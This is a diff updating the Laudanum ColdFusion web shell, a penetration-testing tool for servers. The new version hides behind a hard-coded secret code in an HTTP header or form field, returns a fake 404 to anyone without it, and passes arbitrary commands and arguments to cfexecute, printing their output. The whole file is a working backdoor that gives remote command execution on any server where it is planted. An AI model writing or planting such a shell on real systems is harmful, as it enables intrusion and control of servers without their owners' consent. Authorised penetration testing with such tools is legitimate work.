@@ -1,4 +1,5 @@
 <cfapplication scriptProtect="none">
+
 <!---
 /* *****************************************************************************
 ***
@@ -11,7 +12,7 @@
 ***
 ***  Project Leads:
 ***         Kevin Johnson <kjohnson@secureideas.net
-***         Tim Medin <tim@counterhack.com>
+***         Tim Medin <tim@securitywhole.com>
 ***
 *** Copyright 2013 by Kevin Johnson and the Laudanum Team
 ***
@@ -19,11 +20,9 @@
 ***
 *** This file provides access to shell acces on the system.
 *** Modified by Tim Medin
-***
-********************************************************************************
-***
-*** TODO: Fix the problem with quotes
-***       Add authentication
+*** Modified by Matt Presson <@matt_presson>
+***     - Added some basic authentication via HTTP header
+***     - Resolved cfexecute stripping quotes
 ***
 ********************************************************************************
 *** This program is free software; you can redistribute it and/or
@@ -43,38 +42,58 @@
 ***
 ***************************************************************************** */
 --->
-<cfif #cgi.remote_addr# neq "1.1.1.1">
+
+<cfset secretCode = "a208bddb1f68aa8a8641b65d93979740c82fb387" /> <!--- Set this to something unique like a randomly generated SHA1 Hash --->
+<cfset QuoteMark = "'" />
+<cfset DoubleQuoteMark = """" />
+
+<!--- Authentication: Check for the GUID in either a custom header or POSTed by the form --->
+<cfset suppliedCode = "" />
+<cfif structKeyExists(GetHttpRequestData().headers, "X-Auth-Code")>
+    <cfset suppliedCode = "#StructFind(GetHttpRequestData().headers, "X-Auth-Code")#" />
+<cfelseif structKeyExists(FORM, "authCode")>
+    <cfset suppliedCode = "#StructFind(FORM, "authCode")#" />
+</cfif>
+
+<cfif ( #suppliedCode# neq secretCode )>
     <cfheader statuscode="404" statustext="Page Not Found" />
     <cfabort />
 </cfif>
 
 <html>
-<head><title>Laudanum Coldfusion Shell</title></head>
-<body>
-<form action="shell.cfm" method="POST">
-<cfif IsDefined("form.cmd")>
-Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"> For Windows use: cmd.exe or the full path to cmd.exe<br>
-Arguments: <Input type="text" name="arguments" value="<cfoutput>#HTMLEditFormat(form.arguments)#</cfoutput>"> For Windows use: /c <i>command</i><br>
-<cfelse>
-Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
-Arguments: <Input type="text" name="arguments" value="/c "><br>
-</cfif>
-<input type="submit">
-</form>
+    <head><title>Laudanum Coldfusion Shell</title></head>
+    <body>
+    <form action="<cfoutput>#cgi.script_name#</cfoutput>" method="POST">
+        <cfif IsDefined("form.cmd")>
+        Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"> For Windows use: cmd.exe or the full path to cmd.exe<br>
+        Arguments: <Input type="text" name="arguments" value="<cfoutput>#HTMLEditFormat(form.arguments)#</cfoutput>"> For Windows use: /c <i>command</i><br>
+        <cfelse>
+        Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
+        Arguments: <Input type="text" name="arguments" value="/c "><br>
+        </cfif>
 
-<cfif IsDefined("form.cmd")>
-<pre>
-<cfexecute name="#Replace(preservesinglequotes(form.cmd), QuoteMark, DoubleQuoteMark, 'All')#" arguments="#Replace(preservesinglequotes(form.arguments), QuoteMark, DoubleQuoteMark, 'All')#" timeout="5" variable="foo"></cfexecute>
-<cfoutput>#Replace(foo, "<", "&lt;", "All")#</cfoutput>
-</pre>
-</cfif>
-Note: The cold fusion command that executes shell commands strips quotes, both double and single, so be aware.
+        <input type="hidden" name="authCode" value="<cfoutput>#HTMLEditFormat(suppliedCode)#</cfoutput>">
+        <input type="submit">
+    </form>
 
-  <hr/>
-  <address>
-  Copyright &copy; 2013, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
-  Written by Tim Medin.<br/>
-  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
-  </address>
-</body>
+<!--- Updated the call to cfexecute so use an array instead of a string. This way quotes are not stripped. --->
+<cfif IsDefined("form.cmd")>
+    <cfset argumentsArray = #listToArray(form.arguments, " ")# />
+
+    <pre>
+    <cfexecute name="#Replace(preservesinglequotes(form.cmd), QuoteMark, DoubleQuoteMark, 'All')#" arguments="#argumentsArray#" timeout="5" variable="foo"></cfexecute>
+    <cfoutput>#Replace(foo, "<", "&lt;", "All")#</cfoutput>
+    </pre>
+</cfif>
+
+    Note: The cold fusion command that executes shell commands strips quotes, both double and single, so be aware.
+
+    <hr/>
+    <address>
+        Copyright &copy; 2013, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
+        Written by Tim Medin.<br/>
+        Bug fixes by Matt Presson<br/>
+        Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
+    </address>
+    </body>
 </html>
